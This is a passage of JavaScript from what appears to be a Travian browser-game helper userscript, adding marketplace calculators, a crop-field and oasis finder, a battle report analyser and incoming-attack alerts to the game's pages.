			timerB[t].obj = $eT('TD',timerB[t].time, 0,[['style','background-color:yellow;']]);
			var ct8 = timerB[t++].obj;
			color = 'green';
		} else ct8 = $c('--:-- ',[['style','background-color:yellow;']]);
		var ca8 = $c(Math.round(resNow[i]-cap*s),[['style','background-color:yellow;color:'+color+';']]);
		newT.appendChild($em('TR',[$c(trImg('r'+(i+1))),$c(pc+'%'),ct8,ca8,ct,ca]));
	}
	cont.appendChild(newT);
}

function newT4vCheck () {
	var i = RB.dictFL[23];
	if( ver42FL || $g("tabFavor") )
		RB.dictFL[23] = 1;
	else
		RB.dictFL[23] = 0;
	if( i != RB.dictFL[23] )
		saveCookie( 'DictFL', 'dictFL' );
}

function buildDispatcher () {
	var build = $g('build');
	if( !(build) ) return;
	var gid = build.getAttribute('class');
	gid = gid.split(/\s/)[0];
	if( gid == 'gid17' ) {
		newT4vCheck();
		marketSend(); marketSumm(); marketOffer(); marketBuy(); npcForTroops();
	} else if( gid == 'gid15' ) {
		demolishSave();
	} else if( gid == 'gid16' ) {
		newT4vCheck();
		if( ! /tt=(99|100)/.test(crtPath) && !($g('raidList')) ) {
			if( ver4FL ) stopRP(); incomeResourcesInRP(); detectNameAttaker(); calcAllTrops(); rpFL = true;
			if( $gn('snd') ) { fillXYtoRP(); rpDefaultAction(); abFL=true;}
		} else {
			if( ver4FL ) goldClubInfo(); else viewMessageIWK();
		}
	} else if( gid == 'gid23' ) {
		crannyCalc();
	} else if( gid == 'gid19' || gid == 'gid20' || gid == 'gid21' || gid == 'gid25' || gid == 'gid26' || gid == 'gid29'|| gid == 'gid30' || gid == 'gid36' ) {
		calcTroopCost();
		if( gid == 'gid25' || gid == 'gid26' ) culturePoints();
		if( RB.Setup[11] > 0 ) calcNPCtroops();
	} else if( gid == 'gid11' ) {
		if( RB.dictFL[20] == 0 ) {
			var TM = $g("build_value").rows[0].cells[0].innerHTML.replace(/:/g, "");
			RB.dictionary[21] = TM;
			saveCookie( 'Dict', 'dictionary' );
			RB.dictFL[20] = 1;
			saveCookie( 'DictFL', 'dictFL' );
		}
	} else if( gid == 'gid12' || gid == 'gid13' ) {
		calcUnitUpgrade();
	} else if( ! ver4FL && gid == 'gid37' ) {
		showHeroStatus();
	}//else { alert( gid );}
	underProgressSave(gid);
}

var normalizeProductionCount = 8;
function normalizeProduction () {
	if( RB.Setup[22] < 1 ) return;
	var resT = $g('production');
	if( !(resT) ) return;
	var mm = normalProductionCalc ( income );
	$at(resT.rows[1+mm[0]], [['style','color:green;']]);
	$at(resT.rows[1+mm[1]], [['style','color:red;']]);
}

// by Mike_Sh
function normalProductionCalc ( ires ) {
	var choise = RB.Setup[22] == 1 ? 0: (RB.Setup[22]-1)+RB.Setup[2]*normalizeProductionCount;
	var vNormal = [[10,12,8,6],  // нормальное развитие (производство ресов)/normal development (production resources)
// РИМЛЯНЕ / ROMANS //
	[6,5,8,2],// легионеры / Legionnaire
	[10,13,16,7],// преторианцы / Praetorian
	[15,16,21,8],// империанцы / Imperian
	[7,8,1,2],// конныe разведчики / Equites Legati
	[55,44,32,10],// конница императора / Equites Imperatoris
	[55,64,80,18],// конница Цезаря / Equites Caesaris
	[90,36,50,7],// тараны / Battering Ram
	[95,135,60,9],// огненные катапульты / Fire Catapult
// ГЕРМАНЦЫ / TEUTONS //
	[19,15,8,8],// дубинщики / Clubswinger
	[29,14,17,8],// копейщики / Spearman
	[13,12,17,7],// топорщики / Axeman
	[16,10,5,5],// скауты / Scout
	[74,54,58,15],// паладины / Paladin
	[90,103,96,16],// тевтоны / Teutonic Knight
	[100,30,35,7],// стенобитные орудия / Battering Ram
	[45,60,30,3],// катапульты / Catapult
// ГАЛЛЫ / GAULS //
	[20,26,11,6],// фаланги / Phalanx
	[28,30,37,12],// мечники / Swordsman
	[17,15,2,4],// следопыты / Pathfinder
	[35,45,23,6],// громы / Theutates Thunder
	[36,33,28,12],// друиды / Druidrider
	[100,124,135,34],// эдуи / Haeduan
	[190,111,66,15],// тараны / Battering Ram
	[96,145,63,9]];// требушеты / Trebuchet

	var vPN = [];
	for( var i = 0; i < 4; i++ ) {
		vPN[i] = ires[i] / vNormal[choise][i];
	}
	var minI = 0, maxI = 0;
	var minVal = vPN[0], maxVal = vPN[0];
	for ( i=0; i<(choise?3:4); i++){
		if ( minVal > vPN[i]) {
			minVal = vPN[i];
			minI = i;
		}
		if ( maxVal < vPN[i]) {
			maxVal = vPN[i];
			maxI = i;
		}
	}
	return [maxI,minI];
}

function speedBids () {
	var bform = $gc('auctionDetails',cont)[0];
	if( !(bform) ) return;
	var curBid = parseInt($gt('SPAN',bform)[0].innerHTML);
	$gn('maxBid',bform)[0].value = curBid+parseInt(RB.Setup[23]);
}

function cropFind () {
	if( RB.Setup[26] == 0 ) return;

	function inps (val, iname) {
		return $e('INPUT',[['value',val],['name',iname],['class','text coordinates'],['type','text'],['size','5']]);
	}
	function cropFindReq2 () {
		if( iaFL ) return;
		neFL = true;
		cropFindReq();
	}
	function cropFindReq () {
		if( iaFL ) return;
		iaFL = true;
		if( $g(allIDs[18]) ) cont.removeChild($g(allIDs[18]));
		cont.appendChild($ee('DIV',$ee('span','searching...',[['style','text-decoration:blink;'],['id',allIDs[0]]]),[['id',allIDs[18]]]));
		XY = [parseInt(oX.value),parseInt(oY.value)];
		var zoom = parseInt(oZ.value); if( zoom > 7 || zoom < 1 ) zoom = 2;
		if( ! ver4FL ) zoom *= 2;
		var rK = ver4FL ? 1: 0.5;
		var dX = ver4FL ? 21: 7;
		var dY = ver4FL ? 17: 7;
		var newY = XY[1] - Math.round((zoom-1)*dY/2);
		var curTO = 0;
		aCC.length = 0;
		oasis.length = 0;
		for (var i=zoom; i>0; i--) {
			var newX = XY[0] - Math.round((zoom-1)*dX/2);
			for (var j=zoom; j>0; j--) {
				setTimeout(function(x) { return function() { cropFindGetMap(x); }}({rX:newX,rY:newY,fl:(i==1&&j==1?true:false)}), curTO);
				newX += dX;
				curTO += Math.round(getRandom(500,1500)*rK);
			}
			newY += dY;
		}
	}
	function printResult ( ft, mX, mY , descr ) {
		var des = typeof descr == 'undefined' ? '': descr;
		$g(allIDs[18]).appendChild($em('DIV',[ft,' ',$a(mX+'|'+mY,[['href','karte.php?'+(ver4FL?'x='+mX+'&y='+mY:'z='+xy2id(mX,mY))]])]));
		aCC[aCC.length] = [ft,mX,mY,des];
	}
	function findAnim (x) {
		var vid = xy2id(x[0],x[1]);
		if( typeof chkOasisFL[vid] != "undefined" ) {
			addToolTip(chkOasisFL[vid],x[3].rows[x[2]].cells[2]);
		} else {
			ajaxRequest(fullName+'ajax.php?cmd=viewTileDetails', 'POST', 'cmd=viewTileDetails&x='+x[0]+'&y='+x[1], function(ajaxResp) {
				var mapData = eval('(' + ajaxResp.responseText + ')');
				if(ver42FL) mapData = mapData.response;
				var adv = $ee('DIV',mapData.data.html,[['style','display:none;']]);
				ad = $xf('.//table[@id="troop_info"]','f',adv);
				if( ad ) {
					chkOasisFL[vid] = getTroopsInOasis(ad);
					if( ! iaFL ) addToolTip(chkOasisFL[vid],x[3].rows[x[2]].cells[2]);
				}
			}, dummy);
		}
	}
	function printFinal () {
		if( $g(allIDs[18]) ) cont.removeChild($g(allIDs[18]));
		var cell_id = xy2id(XY[0],XY[1]); // village_aid or xy2id(XY[0],XY[1]) ...
		var aCCs = aCC.sort(function (a,b) {
				var dA = parseFloat(calcDistance( xy2id(a[1],a[2]), cell_id ).toFixed(1));
				var dB = parseFloat(calcDistance( xy2id(b[1],b[2]), cell_id ).toFixed(1));
				if( dA < dB ) return -1;
				if( dA > dB ) return 1;
				return 0;
			});
		var newT = $e('TABLE',[['class',allIDs[7]]]);
		oasis.sort(function(a,b){return parseInt(b[2])-parseInt(a[2]);});
		var curTO = 50;
		for( var i=0; i<aCCs.length; i++ ) {
			if( neFL ) {
				if( aCCs[i][3].e.indexOf('oasis') != -1 && typeof aCCs[i][3].u == "undefined" && anim.checked ) {
					if( typeof chkOasisFL[xy2id(aCCs[i][1],aCCs[i][2])] == "undefined" )
						curTO += getRandom(250,1000);
					else
						curTO += 10;
					setTimeout(function(x) { return function() { findAnim(x) }}([aCCs[i][1],aCCs[i][2],i,newT]), curTO);
				}
				newT.appendChild($em('TR',[
					$c((typeof aCCs[i][3].u != "undefined" ? (ver4FL? $em('A',[aCCs[i][0],(aCCs[i][3].v<5?trImg('nation nation'+aCCs[i][3].v):"")],[['href','spieler.php?uid='+aCCs[i][3].u[0]]]):
					$ee('SPAN',aCCs[i][0],[['class',(aCCs[i][3].v<5?'tribe tribe'+aCCs[i][3].v:"")]])):"")),
					$c((typeof aCCs[i][3].a != "undefined" ? (ver4FL? $a(aCCs[i][3].a[1],[['href','allianz.php?aid='+aCCs[i][3].a[0]]]): aCCs[i][3].a):"")),
					$c(aCCs[i][3].e),
					$c($a(aCCs[i][1]+'|'+aCCs[i][2],[['href',(ver4FL?'position_details.php?x='+aCCs[i][1]+'&y='+aCCs[i][2]:'karte.php?'+aCCs[i][3].d)]])),
					$c('<->'),$c(calcDistance(xy2id(aCCs[i][1],aCCs[i][2]), cell_id).toFixed(1))
  					]));
			} else {
				var oasisCC = 0;
				var oasisCount = 0;
				for( var t=0; t<oasis.length; t++ ) {
					if( Math.abs(aCCs[i][1]-oasis[t][0]) < 4 && Math.abs(aCCs[i][2]-oasis[t][1]) < 4 ) {
						oasisCC += parseInt(oasis[t][2]);
						if( ++oasisCount > 2 ) break;
					}
				}
				newT.appendChild($em('TR',[$c(aCCs[i][0]),$c(oasisCC>0?'+'+oasisCC+'%':''),
					$c($a(aCCs[i][1]+'|'+aCCs[i][2],[['href','karte.php?'+(ver4FL?'x='+aCCs[i][1]+'&y='+aCCs[i][2]:'z='+xy2id(aCCs[i][1],aCCs[i][2]))]])),
					$c(aCCs[i][3]),$c('<->'),$c(calcDistance(xy2id(aCCs[i][1],aCCs[i][2]), cell_id).toFixed(1))]));
			}
		}
		cont.appendChild($ee('P',newT,[['id',allIDs[18]],['style','margin:10px 15px 0px;']]));
		addSpeedAndRTSend($g(allIDs[18]));
		addRefIGM(allIDs[18]);
		neFL = false;
		iaFL = false;
	}
	function parseV4map (o) {
		var ar = new Object();
		if( typeof o.a != 'undefined') {
			var ally = o.t.match(/{k.allianz}(.+?)</)[1];
			ar.a = [o.a, ally];
		}
		var pl = o.t.match(/{k.spieler}(.+?)</)[1];
		ar.u = [o.u, pl];
		var ei = o.t.match(/{k.einwohner}(.+?)</);
		ar.e = ei ? ei[1]: 'oasis';
		if( /{a.r4}/.test(o.t) ) ar.e += ' +'+o.t.match(/{a.r4}\s+(\d+%)/)[1];
		ar.v = o.t.match(/{a.v(\d)}/)[1];
		return [pl,ar];
	}
	function cropFindGetMap ( a ) {
		if( ver4FL ) {
			ajaxRequest(fullName+'ajax.php?cmd=mapPositionData', 'POST', 'cmd=mapPositionData&data[x]='+a.rX+'&data[y]='+a.rY+'&data[zoomLevel]=2&', function(ajaxResp) {
				var mapData = eval('(' + ajaxResp.responseText + ')');
				if(ver42FL) mapData = mapData.response;
				var pRules = [[/{k.f1}/,'Crop 9:',c9],[/{k.f6}/,'Crop 15:',c15],[/{k.f7}/,'4-4-3-7:',c7],[/{k.f8}/,'3-4-4-7:',c7],[/{k.f9}/,'4-3-4-7:',c7]];
				for( var i=0; i < mapData.data.tiles.length; i++ ) {
					if (typeof mapData.data.tiles[i].c != 'undefined') {
						if( neFL ) {
							if( /{k.fo}/.test(mapData.data.tiles[i].c)) {
								printResult( "", mapData.data.tiles[i].x, mapData.data.tiles[i].y, {e:"oasis"} );
							} else if( /k.dt}|{k.bt}/.test(mapData.data.tiles[i].c)) {
								if( mapData.data.tiles[i].u == userID ) continue;
								if( typeof mapData.data.tiles[i].a != 'undefined' && mapData.data.tiles[i].a == RB.dictionary[13] ) continue;
								var md = parseV4map( mapData.data.tiles[i] );
								printResult( md[0], mapData.data.tiles[i].x, mapData.data.tiles[i].y, md[1] );
							}
						} else {
							for( var t=0; t<pRules.length; t++ ) {
								if( pRules[t][0].test(mapData.data.tiles[i].c)) {
									if( pRules[t][2].checked )
										printResult( pRules[t][1], mapData.data.tiles[i].x, mapData.data.tiles[i].y );
								}
							}
							if( /{k.bt}|{k.fo}/.test(mapData.data.tiles[i].c)) {
								if( /{a.r4}/.test(mapData.data.tiles[i].t)) {
									oasis[oasis.length] = [mapData.data.tiles[i].x, mapData.data.tiles[i].y, mapData.data.tiles[i].t.match(/{a.r4}\s+(\d+)%/)[1]];
								}
							}
						}
					}
				}
				if( a.fl ) printFinal();
			}, dummy);
		} else {
			var url = fullName+'ajax.php?f=k7&x='+(a.rX+3)+'&y='+(a.rY-3)+'&xx='+(a.rX-3)+'&yy='+(a.rY+3);
			ajaxRequest(url, 'GET', null, function(ajaxResp) {
				var mapData = eval('(' + ajaxResp.responseText + ')');
				var pRules = [[1,'Crop 9:',c9],[6,'Crop 15:',c15],[7,'4-4-3-7:',c7],[8,'3-4-4-7:',c7],[9,'4-3-4-7:',c7]];
				for( var i=0; i < mapData.length; i++ ) {
					for( var j=0; j < mapData[i].length; j++ ) {
						if( neFL ) {
							if ( mapData[i][j].length == 11 && mapData[i][j][7] !== null ) {
								var ar = {u:mapData[i][j][7], d:mapData[i][j][4], v:mapData[i][j][10]};
								if( mapData[i][j][9] !== null ) ar.a = mapData[i][j][9];
								ar.e = mapData[i][j][8] != "-"? mapData[i][j][8]: "oasis";
								printResult( ar.u, mapData[i][j][0], mapData[i][j][1], ar );
							}
						} else {
							for( var t=0; t<pRules.length; t++ ) {
								if( pRules[t][0] == mapData[i][j][2] ) {
									if( pRules[t][2].checked )
										printResult( pRules[t][1], mapData[i][j][0], mapData[i][j][1], (neFL?{u:pRules[t][1]}:mapData[i][j][7]) );
								}
							}
							if( mapData[i][j][2] == 0 ) {
								var oasisFL = false;
								switch (mapData[i][j][3]) {
									case 3: //+25% +wood
									case 6: //+25% +clay
									case 9: //+25% +iron
									case 10:
									case 11: oasisFL = 25; break;
									case 12: oasisFL = 50; break;
								}
								if( oasisFL ) oasis[oasis.length] = [mapData[i][j][0], mapData[i][j][1], oasisFL];
							}
						}
					}
				}
				if( a.fl ) printFinal();
			}, dummy);
		}
	}

	var aCC = [];
	var oasis = [];
	var neFL = false;
	var iaFL = false;
	var chkOasisFL = new Object();
	var cfText = $a('crop find',[['href',jsVoid]]);
	var cfText2 = $a(gtext('neighbors'),[['href',jsVoid]]);
	cfText.addEventListener('click', cropFindReq, false);
	cfText2.addEventListener('click', cropFindReq2, false);
	var XY = /[\?|&](d=|z=|x=)/.test(crtPath) ? id2xy(getVid(crtPath)): id2xy(village_aid);
	var oX = inps(XY[0],'mX');
	var oY = inps(XY[1],'mY');
	var oZ = inps(2,'zoom');
	var c15 = $e('INPUT',[['type','checkbox'],['checked','checked']]);
	var c9 = $e('INPUT',[['type','checkbox'],['checked','checked']]);
	var c7 = $e('INPUT',[['type','checkbox']]);
	var anim = $e('INPUT',[['type','checkbox']]);
	var anDiv = ver4FL ? $em('SPAN',[' ',trImg('unit u31'),':',anim]): "";
	cont.appendChild($em('DIV',['x:',oX,' y:',oY,' zoom(1-7):',oZ,' 15:',c15,' 9:',c9,' 7:',c7,' ',cfText,' | ',cfText2,anDiv],[['class','contents'],['style','white-space:nowrap;margin:5px 10px 0px;']]));
}

function addFarmToMapT4 ( el ) {
	function farmAdd () {
		RB_setValue(GMcookieID + 'next', xy);
		document.location.href = fullName +'build.php?gid=16&tt=99&action=showSlot&lid='+RB.village_Var[2]+'&sort=distance&direction=asc';
	}
	if( RB.village_Var[2] > 0 ) {
		var md = $gc('detailImage',el?el:cont);
		if( md.length == 0 ) return;
		var xy = $xf('.//a[contains(@href,"z=")]','f',md[0]);
		if( xy ) {
			xy = getVid(xy.getAttribute('href'));
			var link = $a(RB.dictionary[22],[['href','#'],['class','a arrow']]);
			link.addEventListener('click', farmAdd, false);
			$gc('options',md[0])[0].appendChild($ee('DIV',link,[['class','option']]));
		}
	}
}

function addToMapT4 () {
	var md = $gc('detailImage',cont);
	if( md.length == 0 ) return;
	var goMap = $xf('.//a[contains(@href,"x=")]','l',md[0]);
	if( goMap.snapshotLength > 0 ) return;
	$gc('options',md[0])[0].appendChild($ee('DIV',$a(RB.dictionary[15],[['href',crtPath.replace('position_details','karte')],['class','a arrow']]),[['class','option']]));
}

function npcForTroops () {
	var npcT = $g('npc');
	if( !(npcT) ) return;
	var TR = $e('TR');

	var inps = $gt('INPUT', npcT);
	if( inps.length < 8 ) return;

	function redistrNPC ( num ) {
		var tN = parseInt(RB.Setup[2])*10 + num;
		var tRS = troopInfo(tN,3)+troopInfo(tN,4)+troopInfo(tN,5)+troopInfo(tN,6);
		var aCol = Math.floor(resNowSumm / tRS);
		var summ = 0;
		for( var i=0; i<3; i++ ) {
			var tCo = aCol * troopInfo(tN, i+3);
			summ += tCo;
			inps[i*2].value = tCo + sRes[i];
		}
		inps[i*2].value = resNowSumm - summ + sRes[i];
	}
	function redistrNPCcrop () {
		var newMaxCrop = fullRes[3] - sRes[3];
		var newCrop = resNowSumm > newMaxCrop ? newMaxCrop: resNowSumm;
		var deltaRes = resNowSumm > newMaxCrop ? Math.ceil((resNowSumm-newCrop)/3): 0;
		for( var i=0; i<3; i++ ) inps[i*2].value = deltaRes + sRes[i];
		inps[i*2].value = sRes[i] + (resNowSumm > newMaxCrop ? resNowSumm-deltaRes*3: newCrop);
	}

	var sRes = [0,0,0,0];
	for( var i=0; i<4; i++ ) sRes[i] = parseInt(inps[i*2].value).NaN0();
	var sumSRes = sRes[0]+sRes[1]+sRes[2]+sRes[3];
	var resNowSumm = resNow[0]+resNow[1]+resNow[2]+resNow[3] - sumSRes;

	for( var i=1; i<11; i++ ) {
		var tN = parseInt(RB.Setup[2])*10+i;
		var tRS = troopInfo(tN,3)+troopInfo(tN,4)+troopInfo(tN,5)+troopInfo(tN,6);
		var aCol = Math.floor(resNowSumm/tRS);
		var newA = $em('A',[trImg('unit u'+tN),'(',aCol,')'],[['href',jsVoid],['onclick','setTimeout(function (x) { return '+(ver42FL?'Travian.Game.Marketplace.ExchangeResources.':'')+'calculateRest()}, 250);']]);
		newA.addEventListener('click', function(x) { return function() { redistrNPC(x); }}(i), false);
		TR.appendChild($c(newA));
	}
	var newA = $a(trImg('r4'),[['href',jsVoid],['onclick','setTimeout(function (x) { return '+(ver42FL?'Travian.Game.Marketplace.ExchangeResources.':'')+'calculateRest()},250)']]);
	newA.addEventListener('click',redistrNPCcrop, false);
	TR.appendChild($c(newA));
	var tT = $ee('TABLE',TR,[['class',allIDs[7]]]);
	npcT.parentNode.insertBefore(tT, npcT);
}

function analyzerBattle () {
	if( RB.Setup[25] == 0 || RB.dictFL[13] < 2 ) return;
	var report = $g('report_surround');
	if( !(report) ) return;
	if( !($g('attacker')) ) return;
	var tt = $gt('TABLE',report);
	if( tt.length < 2 ) return;

	function parseTroops ( pRows, pRU, ptS ) {
		var pRace = Math.floor(parseInt($gt('IMG',pRows[1].cells[1])[0].getAttribute('class').match(/u(\d+)/)[1])/10);
		for( var i=10; i>0; i-- ) {
			tCount = parseInt(pRows[2].cells[i].innerHTML).NaN0();
			var tKirillC = tCount;
			if( tCount > 0 ) {
				for( j=0; j<pRU.length; j++) ptS[0][j] += troopInfo(pRace*10+i, pRU[j])*tCount;
				if( i < 7 && troopInfo(pRace*10+i, 9) > 1 ) ptS[2] += troopInfo(pRace*10+i, 0)*tCount;
			}
			if( pRows.length > 3 ) if( pRows[3].cells.length > 3 ) {
				tCount = parseInt(pRows[3].cells[i].innerHTML);
				if( tCount > 0 ) {
					for( j=0; j<pRU.length; j++) ptS[1][j] += troopInfo(pRace*10+i, pRU[j])*tCount;
					tKirillC -= tCount;
				}
			}
			kirillS = (tKirillC > 0 ? tKirillC:'')+','+kirillS;
		}
		kirillS = 'r'+kirillRace[pRace]+'u'+kirillS.replace(/,*$/,'');
		return ptS;
	}

	var attakerN = ver4FL ? $gc('role',tt[0].rows[0].cells[0])[0].innerHTML: tt[0].rows[0].cells[0].innerHTML;
	var defenderN = ver4FL ? $gc('role',tt[1].rows[0].cells[0])[0].innerHTML: tt[1].rows[0].cells[0].innerHTML;

	var kirilloid = '#a:';
	var aRow = tt[0].rows;
	var tCount = 0;
	var atS = [[0,0,0,0,0,0,0],[0,0,0,0,0,0,0],0];
	var aRU =  [0,8,3,4,5,6,9];
	var kirillRace = ver4FL ? [0,1,2,3,4]: [1,2,3,0,4];
	var kirillS = '';
	var atS = parseTroops( aRow, aRU, atS );
	kirilloid += kirillS+(ver4FL?'Ub':'')+'#d:';
	if( ver4FL ) kirilloid = kirilloid.replace(/r0(uUb)?/g,'');
	atS[0][1] -= atS[1][1];
	var goods = $gc('res',tt[0]);
	var ress = goods.length > 0 ? goods[0].innerHTML.match(/<img.+?>.*?(\d+).*?<img.+?>.*?(\d+).*?<img.+?>.*?(\d+).*?<img.+?>.*?(\d+).*?/): [0,0,0,0,0];
	ress = [0,parseInt(ress[1]),parseInt(ress[2]),parseInt(ress[3]),parseInt(ress[4])];
	if( ver4FL && goods.length > 1) {
		var crC = parseInt( goods[1].innerHTML.onlyText() );
		if( ! isNaN(crC) ) {
			var pbonus = 0;
			for( var i=1; i<5; i++ ) {
				var t = ress[i]-crC;
				pbonus += t < 0 ? 0: t;
			}
			var pbonusS = $ee('SPAN',' ( &#931;= '+pbonus+' ) ');
			if( pbonus > 0 ) {
				var newT = $e('TABLE',[['class',allIDs[7]]]);
				for( i=1; i<11; i++ ) {
					var trC = troopInfo(i+(parseInt(RB.Setup[2])*10), 8);
					if( trC > 1 ) {
						newT.appendChild($em('TR',[$c(trImg('unit u'+(i+parseInt(RB.Setup[2])*10))),$c(Math.ceil(pbonus/trC))]));
					}
				}
				pbonusS.addEventListener("mouseover", function () { makeTooltip(newT); }, false);
				pbonusS.addEventListener("mouseout", removeTooltip, false);
			}
			goods[1].appendChild(pbonusS)
		}
	}

	var dfS = [[0,0,0,0,0,0,0],[0,0,0,0,0,0,0],0];
	var dRU =  [1,2,3,4,5,6,9];
	var kirillRace = ver4FL ? [0,1,2,3,4]: [1,2,3,4,5];
	var kirillSd = '';
	for( dTc=1; dTc < tt.length; dTc++ ) {
		var dRow = tt[dTc].rows;
		if( dRow.length < 2 ) continue;
		kirillS = '';
		var dfS = parseTroops( dRow, dRU, dfS );
		kirillSd += kirillS+(ver4FL?'U#':';');
	}
	kirilloid += kirillSd.substring(0,2)+(ver4FL?'#':';')+kirillSd;
	kirilloid = kirilloid.replace((ver4FL?/r.uU#/g:/r.u;/g),'');
	if( ver4FL ) kirilloid = kirilloid.replace(/r0u/g,'u');
	kirilloid = kirilloid.replace(/[;#]$/,(ver4FL?'':'#'));

	var adCoords = $xf('.//a[contains(@href, "karte.php")]','l',report);
	if( adCoords.snapshotLength > 1 ) {
		var atCoord = getVid(adCoords.snapshotItem(0).getAttribute('href'));
		var dfCoord = getVid(adCoords.snapshotItem(1).getAttribute('href'));
		var distance = Math.round(calcDistance(atCoord,dfCoord));
		var distRef = $ee('SPAN','&lt;- '+distance+' -&gt;',[['style','white-space:nowrap;']]);
		distRef.addEventListener("mouseover", function() {
			var al = parseInt(RB.Setup[9]) == 0 ? parseInt(RB.village_Var[1]) : parseInt(RB.Setup[9]) - 1;
			makeTooltip(showAllTTime(1, [atCoord,dfCoord], al));
		}, false);
		distRef.addEventListener("mouseout", removeTooltip, false);
	} else var distRef = ' ';

	var newTABLE = $e('TABLE',[['class',allIDs[7]],['style','background-color:white;width:100%;']]);
	newTABLE.appendChild($em('TR',[$c(distRef),$c(attakerN),$c(defenderN),$c(gtext('total'))]));
	// strength
	var newTR = $ee('TR',$em('TD',[trImg('unit u13'),'+',trImg('unit u16')]));
	var strAP = atS[0][0]-atS[2];
	newTR.appendChild($em('TD',[humanRF(strAP),' + ',humanRF(atS[2])]));
	newTR.appendChild($em('TD',[humanRF(dfS[0][0]),' + ',humanRF(dfS[0][1])]));
	var proc = [0,0];
	proc[0] = Math.round(strAP/(strAP+dfS[0][0])*100).NaN0();
	proc[1] = Math.round(atS[2]/(atS[2]+dfS[0][1])*100).NaN0();
	newTR.appendChild($c(proc[0]+' + '+proc[1]+' = '+Math.round((proc[0]+proc[1])/(proc[0]>0 && proc[1] > 0 ? 2: 1))+'%'));
	newTABLE.appendChild(newTR);
	// crop
	proc[0] = Math.round(atS[1][6]/(atS[1][6]+dfS[1][6])*100).NaN0();
	var newTR = $em('TR',[$c(trImg('r5')),$c(humanRF(atS[0][6])+'/'+humanRF(atS[1][6])),
						$c(humanRF(dfS[0][6])+'/'+humanRF(dfS[1][6])),$c(proc[0]+'%')]);
	newTABLE.appendChild(newTR);
	// resource
	var newTR = $ee('TR',$em('TD',[trImg('r1'),'+',trImg('r2'),'+',trImg('r3'),'+',trImg('r4'),'=']));
	proc[0] = atS[1][2]+atS[1][3]+atS[1][4]+atS[1][5];
	if( atS[0][1] == 0 ) ress = [0,0,0,0,0];
	proc[5] = ress[1]+ress[2]+ress[3]+ress[4];
	proc[1] = dfS[1][2]+dfS[1][3]+dfS[1][4]+dfS[1][5];
	proc[4] = proc[1]+proc[5];
	proc[2] = Math.round((proc[0])/(proc[0]+proc[4])*100).NaN0();
	newTR.appendChild($em('TD',[humanRF(atS[1][2])+' + '+humanRF(atS[1][3])+' + '+humanRF(atS[1][4])+' + '+humanRF(atS[1][5]),$e('BR'),' = '+humanRF(proc[0])]));
	newTR.appendChild($em('TD',[humanRF(dfS[1][2]+ress[1])+' + '+humanRF(dfS[1][3]+ress[2])+' + '+humanRF(dfS[1][4]+ress[3])+' + '+humanRF(dfS[1][5]+ress[4]),$e('BR'),' = '+humanRF(proc[4])]));
	newTR.appendChild($c(proc[2]+'%'));
	newTABLE.appendChild(newTR);
	// carry
	var newTR = $ee('TR',$c(trImg(allIDs[33])));
	proc[4] = atS[0][1] > 0 ? Math.round(proc[5]/atS[0][1]*100) : 0;
	newTR.appendChild($c(proc[4]+'%'));
	newTR.appendChild($c($a('(kirilloid)',[['href','http://travian.kirilloid.ru/warsim'+(ver4FL?'2':'')+'.php'+kirilloid],['target','_blank'],['style','font-size:11px;']])));
	proc[4] = proc[5] > 0 ? Math.round((proc[5]-proc[0])/proc[5]*100) : '--';
	newTR.appendChild($c(proc[4]+'%'));
	newTABLE.appendChild(newTR);

	var toLog = $a('travian-reports.net');
	toLog.addEventListener("click", addReport, true);
	newTABLE.appendChild($ee('TR',$c(toLog,[['colspan',4]])));

	tt[0].parentNode.appendChild(newTABLE);
}

function returnQuickHelp () {
	var qh = $g('anwersQuestionMark');
	var i = "return Travian.Game.iPopup(0,0, 'gid');"; //'return Travian.iPopup(0,0);'
	if( qh ) $at($gt('A',qh)[0],[['href','#'],['onclick',i]]);
	else {
		if( ver42FL )
			$ib($ee('li', $ee('A',trImg(''),[['href','#'],['target','_blank'],['onclick',i]]), [['class',"help"]]),$g('outOfGame').firstChild);
		else
			$g('mid').parentNode.appendChild($ee('div', $e('A',[['href','#'],['target','_blank'],['onclick',i]]), [['id',"anwersQuestionMark"]]));
	}
}

function rpDefaultAction () {
	var nc = $xf('.//input[@name="c"]','l',cont);
	if( nc.snapshotLength < 3 ) return;
	if( RB.Setup[27] > 0 ) if( typeof nc.snapshotItem(RB.Setup[27]).getAttribute('disabled') != "string" ) nc.snapshotItem(RB.Setup[27]).checked = true;
	if( RB.dictFL[16] > 0 ) return;
	for( var i=0; i<nc.snapshotLength; i++ ) {
		RB.dictionary[16+i] = nc.snapshotItem(i).parentNode.innerHTML.onlyText().trim();
	}
	saveCookie( 'Dict', 'dictionary' );
	RB.dictFL[16] = 1;
	saveCookie( 'DictFL', 'dictFL' );
}

function addAReportFilter () {
	dictRpInit();
	var newD = $e('DIV',[['style','white-space:nowrap;padding:5px;']]);
	for( var i=0; i<iReports.length; i++ ) {
		newD.appendChild($a(trImg('iReport iReport'+iReports[i], RB.dictRp[i]),[['href',fullName + 'allianz.php?s=3&f='+iReports[i]+(ver4FL?'&fn=0':'')],['style','margin:2px;']]));
	}
	cont.appendChild(newD);
}

function restHeroTime () {
	var timers = $xf('.//span[contains(@id, "timer")]','l',cont);
	for( var i=0; i<timers.snapshotLength; i++ ) {
		timers.snapshotItem(i).parentNode.insertBefore($em('SPAN',['(',formatTime(absTime(toSeconds(timers.snapshotItem(i).innerHTML)),4),')']), timers.snapshotItem(i).nextSibling);
	}
}

function detectAttack () {
	if( RB.Setup[30] < 1 ) return;

	function getAttackAInfo31 () {
		ajaxRequest(fullName +'dorf1.php', 'GET', null, function(ajaxResp) {
			var ad = ajaxNDIV(ajaxResp);
			var move = $xf('.//*[@id="movements"]','f',ad);
			ad = null;
			RB.attackList.length = 1;
			if (move) {
				if( /att1|att3/.test(move.innerHTML) ) {
					RB.attackList[1]=1;
				}
			}
			RB.attackList[0] = new Date().getTime();
			RB_setValue(GMcookieID + 'Att', JSON.stringify(RB.attackList));
			nextCheck = getRandom(basePeriod,2e5);
			setTimeout( getAttackAInfo31, nextCheck);
			showAtt();
			if( RB.attackList.length > 1 ) show_alert();
		}, showError);
	}
	function getAttackAInfo () {
		$g(allIDs[23]).innerHTML = "checking";
		FreezeScreen(true);
		RB.attackList.length = 1;
		var curTO = 0;
		for( var i=0; i<linkVSwitch.length; i++ ) {
			curTO += getRandom(300,1000);
			setTimeout(function(x) { return function() { findAttack(x); }}(i), curTO);
		}
	}
	function showAtt () {
		var aDv = $g(allIDs[23]);
		if( !(aDv) ) {
			aDv = $e('DIV',[['style','max-width:100px;'],['id',allIDs[23]]]);
			makeFloatD(aDv, 10);
			timerNum = timerB.length;
			lastTimerB = timerNum+1;
		}
